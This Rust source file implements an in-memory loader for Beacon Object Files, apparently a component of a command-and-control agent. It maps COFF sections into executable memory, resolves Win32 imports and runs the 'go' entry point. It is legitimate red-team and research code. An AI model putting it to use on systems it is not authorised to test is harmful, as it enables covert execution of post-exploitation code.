//! BOF (Beacon Object File) in-memory loader.
//!
//! Takes a parsed `CoffFile`, maps sections into executable memory, applies
//! relocations, resolves external symbols (Beacon API + Win32 DLL imports),
//! and invokes the `go` entry point.

#![cfg(target_os = "windows")]

use std::collections::HashMap;
use std::ffi::{c_char, c_int, c_void, CString};
use std::ptr;

use anyhow::{anyhow, bail, ensure, Context, Result};

use super::beacon_api;
use super::coff_parser::*;

// ── Win32 FFI ─────────────────────────────────────────────────────────────────

#[link(name = "kernel32")]
unsafe extern "system" {
    fn VirtualAlloc(
        lpAddress: *mut c_void,
        dwSize: usize,
        flAllocationType: u32,
        flProtect: u32,
    ) -> *mut c_void;
    fn VirtualFree(lpAddress: *mut c_void, dwSize: usize, dwFreeType: u32) -> i32;
    fn VirtualProtect(
        lpAddress: *mut c_void,
        dwSize: usize,
        flNewProtect: u32,
        lpflOldProtect: *mut u32,
    ) -> i32;
    fn LoadLibraryA(lpLibFileName: *const c_char) -> *mut c_void;
    fn GetProcAddress(hModule: *mut c_void, lpProcName: *const c_char) -> *mut c_void;
}

const MEM_COMMIT: u32 = 0x1000;
const MEM_RESERVE: u32 = 0x2000;
const MEM_RELEASE: u32 = 0x8000;
const PAGE_READWRITE: u32 = 0x04;
const PAGE_EXECUTE_READ: u32 = 0x20;
const PAGE_READONLY: u32 = 0x02;

// ── BOF Loader ────────────────────────────────────────────────────────────────

/// A loaded BOF ready for execution.
pub struct BofLoader {
    /// Base allocation pointer (for VirtualFree).
    base: *mut u8,
    /// Total size of the allocation.
    total_size: usize,
    /// Per-section: (offset_in_alloc, size, is_code).
    section_map: Vec<SectionMapping>,
    /// Resolved symbol addresses (by symbol index).
    symbol_addrs: Vec<usize>,
    /// Entry point address (`go` function).
    entry: usize,
}

struct SectionMapping {
    offset: usize,
    size: usize,
    is_code: bool,
    is_writable: bool,
}

impl BofLoader {
    /// Parse a COFF file and load it into executable memory.
    pub fn load(data: &[u8]) -> Result<Self> {
        let coff = CoffFile::parse(data)?;
        let beacon_table = beacon_api::beacon_api_table();

        // ── Calculate total memory needed ─────────────────────────────────────
        // Align each section to 16 bytes.
        let mut total_size = 0usize;
        let mut section_map = Vec::with_capacity(coff.sections.len());

        for sec in &coff.sections {
            let sec_size = if sec.header.characteristics & IMAGE_SCN_CNT_UNINITIALIZED_DATA != 0 {
                // .bss — use VirtualSize
                sec.header.virtual_size.max(sec.header.size_of_raw_data) as usize
            } else {
                sec.header.size_of_raw_data as usize
            };
            let aligned = (sec_size + 15) & !15;
            let is_code = sec.header.characteristics & IMAGE_SCN_CNT_CODE != 0;
            let is_writable = sec.header.characteristics & IMAGE_SCN_MEM_WRITE != 0;
            section_map.push(SectionMapping {
                offset: total_size,
                size: sec_size,
                is_code,
                is_writable,
            });
            total_size += aligned;
        }

        ensure!(total_size > 0, "no sections to load");
        ensure!(total_size <= 64 * 1024 * 1024, "BOF too large (>{} MB)", 64);

        // ── Allocate RW memory ────────────────────────────────────────────────
        let base = unsafe {
            VirtualAlloc(
                ptr::null_mut(),
                total_size,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE,
            )
        } as *mut u8;
        if base.is_null() {
            bail!("VirtualAlloc failed for {} bytes", total_size);
        }

        // ── Copy section data ─────────────────────────────────────────────────
        for (i, sec) in coff.sections.iter().enumerate() {
            let mapping = &section_map[i];
            if sec.header.size_of_raw_data > 0 {
                let src = sec.header.raw_data(data)?;
                unsafe {
                    ptr::copy_nonoverlapping(src.as_ptr(), base.add(mapping.offset), src.len());
                }
            }
            // .bss is already zeroed by VirtualAlloc(MEM_COMMIT).
        }

        // ── Build symbol address table ────────────────────────────────────────
        let mut symbol_addrs = vec![0usize; coff.symbols.len()];
        let mut dll_cache: HashMap<String, *mut c_void> = HashMap::new();

        for (idx, sym) in coff.symbols.iter().enumerate() {
            if sym.is_undefined() && sym.is_external() {
                // External import — resolve it.
                let addr = resolve_external(
                    &sym.name,
                    &beacon_table,
                    &mut dll_cache,
                )?;
                symbol_addrs[idx] = addr;
            } else if sym.section_number > 0 {
                // Defined symbol — compute address within our allocation.
                let sec_idx = (sym.section_number - 1) as usize;
                if sec_idx < section_map.len() {
                    symbol_addrs[idx] =
                        base as usize + section_map[sec_idx].offset + sym.value as usize;
                }
            }
            // section_number == -1 (absolute) or -2 (debug): leave at 0.
        }

        // ── Apply relocations ─────────────────────────────────────────────────
        for (sec_idx, sec) in coff.sections.iter().enumerate() {
            let sec_base = base as usize + section_map[sec_idx].offset;
            for reloc in &sec.relocations {
                let target_addr = symbol_addrs
                    .get(reloc.symbol_table_index as usize)
                    .copied()
                    .unwrap_or(0);
                if target_addr == 0 {
                    let sym_name = coff
                        .symbols
                        .get(reloc.symbol_table_index as usize)
                        .map(|s| s.name.as_str())
                        .unwrap_or("<unknown>");
                    bail!(
                        "unresolved symbol '{}' (index {}) in section '{}'",
                        sym_name,
                        reloc.symbol_table_index,
                        sec.header.name(&coff.string_table)
                    );
                }
                apply_relocation(sec_base, reloc, target_addr)?;
            }
        }

        // ── Find entry point ──────────────────────────────────────────────────
        let go_sym = coff
            .symbol_by_name("go")
            .or_else(|| coff.symbol_by_name("_go"))
            .context("BOF has no 'go' entry point symbol")?;
        ensure!(
            go_sym.section_number > 0,
            "'go' symbol is not defined in any section"
        );
        let entry_sec_idx = (go_sym.section_number - 1) as usize;
        let entry = base as usize + section_map[entry_sec_idx].offset + go_sym.value as usize;

        // ── Set memory protections ────────────────────────────────────────────
        for mapping in &section_map {
            let prot = if mapping.is_code {
                PAGE_EXECUTE_READ
            } else if mapping.is_writable {
                PAGE_READWRITE
            } else {
                PAGE_READONLY
            };
            let mut old_prot = 0u32;
            unsafe {
                VirtualProtect(
                    base.add(mapping.offset) as *mut c_void,
                    mapping.size,
                    prot,
                    &mut old_prot,
                );
            }
        }

        Ok(BofLoader {
            base,
            total_size,
            section_map,
            symbol_addrs,
            entry,
        })
    }

    /// Execute the BOF `go(char* args, int args_len)` entry point.
    ///
    /// # Safety
    /// The loaded COFF code is arbitrary native code. The caller must ensure
    /// the BOF is trusted.
    pub unsafe fn run(&self, args: &[u8]) -> String {
        beacon_api::clear_output();

        type GoFn = unsafe extern "C" fn(*const c_char, c_int);
        let go: GoFn = unsafe { std::mem::transmute(self.entry) };

        let args_ptr = if args.is_empty() {
            ptr::null()
        } else {
            args.as_ptr() as *const c_char
        };
        let args_len = args.len() as c_int;

        unsafe { go(args_ptr, args_len) };

        beacon_api::take_output()
    }
}

impl Drop for BofLoader {
    fn drop(&mut self) {
        if !self.base.is_null() {
            unsafe {
                VirtualFree(self.base as *mut c_void, 0, MEM_RELEASE);
            }
            self.base = ptr::null_mut();
        }
    }
}

// SAFETY: The raw pointers in BofLoader point to memory that is exclusively
// owned by this instance and freed on Drop. The loader is created and consumed
// on a single thread (spawn_blocking), but we need Send to move it across
// the tokio task boundary.
unsafe impl Send for BofLoader {}

// ── Symbol resolution ─────────────────────────────────────────────────────────

/// Resolve an external (undefined) symbol to a function pointer address.
///
/// Naming conventions:
/// - `__imp_BeaconPrintf` → lookup in Beacon API table
/// - `__imp_KERNEL32$CreateFileW` → LoadLibraryA("KERNEL32") + GetProcAddress("CreateFileW")
fn resolve_external(
    name: &str,
    beacon_table: &HashMap<&str, usize>,
    dll_cache: &mut HashMap<String, *mut c_void>,
) -> Result<usize> {
    // Strip `__imp_` prefix if present (MSVC import convention).
    let stripped = name
        .strip_prefix("__imp_")
        .unwrap_or(name);

    // Check Beacon API first.
    if let Some(&addr) = beacon_table.get(stripped) {
        return Ok(addr);
    }

    // DLL import: `DLL$Function` pattern.
    if let Some(dollar_pos) = stripped.find('$') {
        let dll_name = &stripped[..dollar_pos];
        let func_name = &stripped[dollar_pos + 1..];

        let module = load_dll_cached(dll_name, dll_cache)?;
        let func_cstr =
            CString::new(func_name).context("invalid function name for GetProcAddress")?;
        let proc = unsafe { GetProcAddress(module, func_cstr.as_ptr()) };
        if proc.is_null() {
            bail!(
                "GetProcAddress failed: {}!{} not found",
                dll_name,
                func_name
            );
        }
        return Ok(proc as usize);
    }

    // Bare Beacon API name without __imp_ prefix.
    if let Some(&addr) = beacon_table.get(name) {
        return Ok(addr);
    }

    bail!("unresolved external symbol: {}", name);
}

fn load_dll_cached(
    dll_name: &str,
    cache: &mut HashMap<String, *mut c_void>,
) -> Result<*mut c_void> {
    let key = dll_name.to_ascii_uppercase();
    if let Some(&h) = cache.get(&key) {
        return Ok(h);
    }

    // Append .dll if not present.
    let full_name = if key.ends_with(".DLL") {
        key.clone()
    } else {
        format!("{}.dll", key)
    };
    let cstr = CString::new(full_name.as_str()).context("invalid DLL name")?;
    let h = unsafe { LoadLibraryA(cstr.as_ptr()) };
    if h.is_null() {
        bail!("LoadLibraryA failed for '{}'", dll_name);
    }
    cache.insert(key, h);
    Ok(h)
}

// ── Relocation application ────────────────────────────────────────────────────

fn apply_relocation(sec_base: usize, reloc: &Relocation, target: usize) -> Result<()> {
    let patch_addr = sec_base + reloc.virtual_address as usize;

    match reloc.typ {
        IMAGE_REL_AMD64_ADDR64 => {
            // 64-bit absolute address.
            let ptr = patch_addr as *mut u64;
            let existing = unsafe { ptr.read_unaligned() } as u64;
            unsafe { ptr.write_unaligned(existing.wrapping_add(target as u64)) };
        }
        IMAGE_REL_AMD64_ADDR32 => {
            // 32-bit absolute address (lower 32 bits).
            let ptr = patch_addr as *mut u32;
            let existing = unsafe { ptr.read_unaligned() };
            unsafe { ptr.write_unaligned(existing.wrapping_add(target as u32)) };
        }
        IMAGE_REL_AMD64_ADDR32NB => {
            // 32-bit RVA (image-base-relative, but for .o files this is
            // effectively the same as a 32-bit delta from patch site to target).
            let ptr = patch_addr as *mut i32;
            let existing = unsafe { ptr.read_unaligned() };
            let delta = (target as i64) - (patch_addr as i64);
            unsafe { ptr.write_unaligned(existing.wrapping_add(delta as i32)) };
        }
        IMAGE_REL_AMD64_REL32
        | 0x0005 // REL32_1
        | 0x0006 // REL32_2
        | 0x0007 // REL32_3
        | 0x0008 // REL32_4
        | 0x0009 // REL32_5
        => {
            // RIP-relative 32-bit displacement.
            // The extra REL32_N variants subtract N from the addend to account
            // for the instruction encoding offset.
            let addend: i64 = match reloc.typ {
                0x0005 => -1,
                0x0006 => -2,
                0x0007 => -3,
                0x0008 => -4,
                0x0009 => -5,
                _ => 0,
            };
            let ptr = patch_addr as *mut i32;
            let existing = unsafe { ptr.read_unaligned() } as i64;
            // RIP at this point = patch_addr + 4 (size of the 32-bit field).
            let rip = patch_addr as i64 + 4;
            let delta = (target as i64) - rip + existing + addend;
            unsafe { ptr.write_unaligned(delta as i32) };
        }
        IMAGE_REL_AMD64_ABSOLUTE => {
            // Padding / alignment — no-op.
        }
        _ => {
            bail!(
                "unsupported relocation type 0x{:04X} at offset 0x{:X}",
                reloc.typ,
                reloc.virtual_address
            );
        }
    }
    Ok(())
}
